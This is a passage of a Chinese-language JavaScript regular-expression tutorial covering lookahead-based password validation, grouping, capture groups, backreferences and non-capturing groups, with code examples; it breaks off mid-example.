简化</strong></p><p>不考虑“但必须至少包括2种字符”这一条件。我们可以容易写出：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex">/^[0-9A-Za-z]{6,12}$/</span><span class="token punctuation">;</span>复制代码</code></pre><p><strong>4.3.2 判断是否包含有某一种字符</strong></p><p>假设，要求的必须包含数字，怎么办？此时我们可以使用<code>(?=.*[0-9])</code>来做。</p><p>因此正则变成：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex">/(?=.*[0-9])^[0-9A-Za-z]{6,12}$/</span><span class="token punctuation">;</span>复制代码</code></pre><p><strong>4.3.3 同时包含具体两种字符</strong></p><p>比如同时包含数字和小写字母，可以用<code>(?=.*[0-9])(?=.*[a-z])</code>来做。</p><p>因此正则变成：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex">/(?=.*[0-9])(?=.*[a-z])^[0-9A-Za-z]{6,12}$/</span><span class="token punctuation">;</span>复制代码</code></pre><p><strong>4.3.4 解答</strong></p><p>我们可以把原题变成下列几种情况之一：</p><ol><li>同时包含数字和小写字母</li><li>同时包含数字和大写字母</li><li>同时包含小写字母和大写字母</li><li>同时包含数字、小写字母和大写字母</li></ol><p>以上的4种情况是或的关系（实际上，可以不用第4条）。</p><p>最终答案是：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex">/((?=.*[0-9])(?=.*[a-z])|(?=.*[0-9])(?=.*[A-Z])|(?=.*[a-z])(?=.*[A-Z]))^[0-9A-Za-z]{6,12}$/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"1234567"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false 全是数字</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"abcdef"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false 全是小写字母</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"ABCDEFGH"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false 全是大写字母</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"ab23C"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false 不足6位</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"ABCDEF234"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true 大写字母和数字</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"abcdEF234"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true 三者都有</span>复制代码</code></pre><p><strong>4.3.5 解惑</strong></p><p>上面的正则看起来比较复杂，只要理解了第二步，其余就全部理解了。</p><p><code>/(?=.*[0-9])^[0-9A-Za-z]{6,12}$/</code></p><p>对于这个正则，我们只需要弄明白<code>(?=.*[0-9])^</code>即可。</p><p>分开来看就是<code>(?=.*[0-9])</code>和<code>^</code>。</p><p>表示开头前面还有个位置（当然也是开头，即同一个位置，想想之前的空字符类比）。</p><p><code>(?=.*[0-9])</code>表示该位置后面的字符匹配<code>.*[0-9]</code>，即，有任何多个任意字符，后面再跟个数字。</p><p>翻译成大白话，就是接下来的字符，必须包含个数字。</p><p><strong>4.3.6 另外一种解法</strong></p><p>“至少包含两种字符”的意思就是说，不能全部都是数字，也不能全部都是小写字母，也不能全部都是大写字母。</p><p>那么要求“不能全部都是数字”，怎么做呢？<code>(?!p)</code>出马！</p><p>对应的正则是：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex">/(?!^[0-9]{6,12}$)^[0-9A-Za-z]{6,12}$/</span><span class="token punctuation">;</span>复制代码</code></pre><p>三种“都不能”呢？</p><p>最终答案是：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex">/(?!^[0-9]{6,12}$)(?!^[a-z]{6,12}$)(?!^[A-Z]{6,12}$)^[0-9A-Za-z]{6,12}$/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"1234567"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false 全是数字</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"abcdef"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false 全是小写字母</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"ABCDEFGH"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false 全是大写字母</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"ab23C"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false 不足6位</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"ABCDEF234"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true 大写字母和数字</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"abcdEF234"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true 三者都有</span>复制代码</code></pre><h3 id="第二章小结"><a href="#第二章小结" class="headerlink" title="第二章小结"></a>第二章小结</h3><p>位置匹配相关的案例，挺多的，不一而足。</p><p>掌握匹配位置的这6个锚字符，给我们解决正则问题一个新工具。</p><h2 id="第三章-正则表达式括号的作用"><a href="#第三章-正则表达式括号的作用" class="headerlink" title="第三章 正则表达式括号的作用"></a>第三章 正则表达式括号的作用</h2><p>不管哪门语言中都有括号。正则表达式也是一门语言，而括号的存在使这门语言更为强大。</p><p>对括号的使用是否得心应手，是衡量对正则的掌握水平的一个侧面标准。</p><p>括号的作用，其实三言两语就能说明白，括号提供了分组，便于我们引用它。</p><p>引用某个分组，会有两种情形：在JavaScript里引用它，在正则表达式里引用它。</p><p>本章内容虽相对简单，但我也要写长点。</p><p>内容包括：</p><ol><li>分组和分支结构</li><li>捕获分组</li><li>反向引用</li><li>非捕获分组</li><li>相关案例</li></ol><h3 id="1-分组和分支结构"><a href="#1-分组和分支结构" class="headerlink" title="1. 分组和分支结构"></a>1. 分组和分支结构</h3><p>这二者是括号最直觉的作用，也是最原始的功能。</p><p><strong>1.1 分组</strong></p><p>我们知道<code>/a+/</code>匹配连续出现的“a”，而要匹配连续出现的“ab”时，需要使用<code>/(ab)+/</code>。</p><p>其中括号是提供分组功能，使量词<code>+</code>作用于“ab”这个整体，测试如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(ab)+/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"ababa abbb ababab"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["abab", "ab", "ababab"]</span>复制代码</code></pre><p><strong>1.2 分支结构</strong></p><p>而在多选分支结构<code>(p1|p2)</code>中，此处括号的作用也是不言而喻的，提供了子表达式的所有可能。</p><p>比如，要匹配如下的字符串：</p><blockquote><p>I love JavaScript</p><p>I love Regular Expression</p></blockquote><p>可以使用正则：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^I love (JavaScript|Regular Expression)$/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"I love JavaScript"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"I love Regular Expression"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true</span><span class="token comment" spellcheck="true">// => true复制代码</span></code></pre><p>如果去掉正则中的括号，即<code>/^I love JavaScript|Regular Expression$/</code>，匹配字符串是”I love JavaScript”和”Regular Expression”，当然这不是我们想要的。</p><h3 id="2-引用分组"><a href="#2-引用分组" class="headerlink" title="2. 引用分组"></a>2. 引用分组</h3><p>这是括号一个重要的作用，有了它，我们就可以进行数据提取，以及更强大的替换操作。</p><p>而要使用它带来的好处，必须配合使用实现环境的API。</p><p>以日期为例。假设格式是yyyy-mm-dd的，我们可以先写一个简单的正则：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d{4}-\d{2}-\d{2}/</span><span class="token punctuation">;</span>复制代码</code></pre><p>然后再修改成括号版的：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d{4})-(\d{2})-(\d{2})/</span><span class="token punctuation">;</span>复制代码</code></pre><p>为什么要使用这个正则呢？</p><p><strong>2.1 提取数据</strong></p><p>比如提取出年、月、日，可以这么做：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d{4})-(\d{2})-(\d{2})/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-12"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["2017-06-12", "2017", "06", "12", index: 0, input: "2017-06-12"]</span>复制代码</code></pre><p><code>match</code>返回的一个数组，第一个元素是整体匹配结果，然后是各个分组（括号里）匹配的内容，然后是匹配下标，最后是输入的文本。（注意：如果正则是否有修饰符<code>g</code>，<code>match</code>返回的数组格式是不一样的）。</p><p>另外也可以使用正则对象的<code>exec</code>方法：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d{4})-(\d{2})-(\d{2})/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-12"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["2017-06-12", "2017", "06", "12", index: 0, input: "2017-06-12"]</span>复制代码</code></pre><p>同时，也可以使用构造函数的全局属性<code>$1</code>至<code>$9</code>来获取：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d{4})-(\d{2})-(\d{2})/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-12"</span><span class="token punctuation">;</span>regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 正则操作即可，例如</span><span class="token comment" spellcheck="true">//regex.exec(string);</span><span class="token comment" spellcheck="true">//string.match(regex);</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>RegExp<span class="token punctuation">.</span>$<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "2017"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>RegExp<span class="token punctuation">.</span>$<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "06"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>RegExp<span class="token punctuation">.</span>$<span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "12"</span>复制代码</code></pre><p><strong>2.2 替换</strong></p><p>比如，想把yyyy-mm-dd格式，替换成mm/dd/yyyy怎么做？</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d{4})-(\d{2})-(\d{2})/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-12"</span><span class="token punctuation">;</span><span class="token keyword">var</span> result <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>regex<span class="token punctuation">,</span> <span class="token string">"$2/$3/$1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "06/12/2017"</span>复制代码</code></pre><p>其中<code>replace</code>中的，第二个参数里用<code>$1</code>、<code>$2</code>、<code>$3</code>指代相应的分组。等价于如下的形式：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d{4})-(\d{2})-(\d{2})/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-12"</span><span class="token punctuation">;</span><span class="token keyword">var</span> result <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>regex<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> RegExp<span class="token punctuation">.</span>$<span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> RegExp<span class="token punctuation">.</span>$<span class="token number">3</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> RegExp<span class="token punctuation">.</span>$<span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "06/12/2017"</span>复制代码</code></pre><p>也等价于：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d{4})-(\d{2})-(\d{2})/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"2017-06-12"</span><span class="token punctuation">;</span><span class="token keyword">var</span> result <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>regex<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">,</span> year<span class="token punctuation">,</span> month<span class="token punctuation">,</span> day<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> month <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> day <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> year<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "06/12/2017"</span>复制代码</code></pre><h3 id="3-反向引用"><a href="#3-反向引用" class="headerlink" title="3. 反向引用"></a>3. 反向引用</h3><p>除了使用相应API来引用分组，也可以在正则本身里引用分组。但只能引用之前出现的分组，即反向引用。</p><p>还是以日期为例。</p><p>比如要写一个正则支持匹配如下三种格式：</p><blockquote><p>2016-06-12</p><p>2016/06/12</p><p>2016.06.12</p></blockquote><p>最先可能想到的正则是:</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d{4}(-|\/|\.)\d{2}(-|\/|\.)\d{2}/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string1 <span class="token operator">=</span> <span class="token string">"2017-06-12"</span><span class="token punctuation">;</span><span class="token keyword">var</span> string2 <span class="token operator">=</span> <span class="token string">"2017/06/12"</span><span class="token punctuation">;</span><span class="token keyword">var</span> string3 <span class="token operator">=</span> <span class="token string">"2017.06.12"</span><span class="token punctuation">;</span><span class="token keyword">var</span> string4 <span class="token operator">=</span> <span class="token string">"2016-06/12"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string2<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string3<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string4<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>复制代码</code></pre><p>其中<code>/</code>和<code>.</code>需要转义。虽然匹配了要求的情况，但也匹配”2016-06/12”这样的数据。</p><p>假设我们想要求分割符前后一致怎么办？此时需要使用反向引用：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d{4}(-|\/|\.)\d{2}\1\d{2}/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string1 <span class="token operator">=</span> <span class="token string">"2017-06-12"</span><span class="token punctuation">;</span><span class="token keyword">var</span> string2 <span class="token operator">=</span> <span class="token string">"2017/06/12"</span><span class="token punctuation">;</span><span class="token keyword">var</span> string3 <span class="token operator">=</span> <span class="token string">"2017.06.12"</span><span class="token punctuation">;</span><span class="token keyword">var</span> string4 <span class="token operator">=</span> <span class="token string">"2016-06/12"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string2<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string3<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string4<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span>复制代码</code></pre><p>注意里面的<code>\1</code>，表示的引用之前的那个分组<code>(-|\/|\.)</code>。不管它匹配到什么（比如-），<code>\1</code>都匹配那个同样的具体某个字符。</p><p>我们知道了<code>\1</code>的含义后，那么<code>\2</code>和<code>\3</code>的概念也就理解了，即分别指代第二个和第三个分组。</p><p>看到这里，此时，恐怕你会有三个问题。</p><p><strong>3.1 括号嵌套怎么办？</strong></p><p>以左括号（开括号）为准。比如：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^((\d)(\d(\d)))\1\2\3\4$/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"1231231233"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>$<span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 123</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>$<span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>$<span class="token number">3</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 23</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>$<span class="token number">4</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 3</span>复制代码</code></pre><p>我们可以看看这个正则匹配模式：</p><ul><li>第一个字符是数字，比如说1，</li><li>第二个字符是数字，比如说2，</li><li>第三个字符是数字，比如说3，</li><li>接下来的是<code>\1</code>，是第一个分组内容，那么看第一个开括号对应的分组是什么，是123，</li><li>接下来的是<code>\2</code>，找到第2个开括号，对应的分组，匹配的内容是1，</li><li>接下来的是<code>\3</code>，找到第3个开括号，对应的分组，匹配的内容是23，</li><li>最后的是<code>\4</code>，找到第3个开括号，对应的分组，匹配的内容是3。</li></ul><p>这个问题，估计仔细看一下，就该明白了。</p><p><strong>3.2 \10表示什么呢？</strong></p><p>另外一个疑问可能是，即<code>\10</code>是表示第10个分组，还是<code>\1</code>和<code>0</code>呢？</p><p>答案是前者，虽然一个正则里出现<code>\10</code>比较罕见。测试如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(1)(2)(3)(4)(5)(6)(7)(8)(9)(#) \10+/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"123456789# ######"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true复制代码</span></code></pre><p><strong>3.3 引用不存在的分组会怎样？</strong></p><p>因为反向引用，是引用前面的分组，但我们在正则里引用了不存在的分组时，此时正则不会报错，只是匹配反向引用的字符本身。例如<code>\2</code>，就匹配”\2”。注意”\2”表示对”2”进行了转意。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\1\2\3\4\5\6\7\8\9/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"\1\2\3\4\5\6\7\8\9"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token string">"\1\2\3\4\5\6\7\8\9"</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>复制代码</code></pre><p>chrome浏览器打印的结果：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/f75ad2642625466dd5adcad3e2a4c51a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h3 id="4-非捕获分组"><a href="#4-非捕获分组" class="headerlink" title="4. 非捕获分组"></a>4. 非捕获分组</h3><p>之前文中出现的分组，都会捕获它们匹配到的数据，以便后续引用，因此也称他们是捕获型分组。</p><p>如果只想要括号最原始的功能，但不会引用它，即，既不在API里引用，也不在正则里反向引用。此时可以使用非捕获分组<code>(?:p)</code>，例如本文第一个例子可以修改为：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(?:ab)+/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"ababa abbb ababab"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["abab", "ab", "ababab"]</span>复制代码</code></pre><h3 id="5-相关案例"><a href="#5-相关案例" class="headerlink" title="5. 相关案例"></a>5. 相关案例</h3><p>至此括号的作用已经讲完了，总结一句话，就是提供了可供我们使用的分组，如何用就看我们的了。</p><p><strong>5.1 字符串trim方法模拟</strong></p><p><code>trim</code>方法是去掉字符串的开头和结尾的空白符。有两种思路去做。</p><p>第一种，匹配到开头和结尾的空白符，然后替换成空字符。如：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">trim</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/^\s+|\s+$/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token string">"  foobar   "</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "foobar"</span>复制代码</code></pre><p>第二种，匹配整个字符串，然后用引用来提取出相应的数据：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">trim</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/^\s*(.*?)\s*$/g</span><span class="token punctuation">,</span> <span class="token string">"$1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token string">"  foobar   "</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "foobar"</span>复制代码</code></pre><p>这里使用了惰性匹配<code>*?</code>，不然也会匹配最后一个空格之前的所有空格的。</p><p>当然，前者效率高。</p><p><strong>5.2 将每个单词的首字母转换为大写</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">titleize</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token 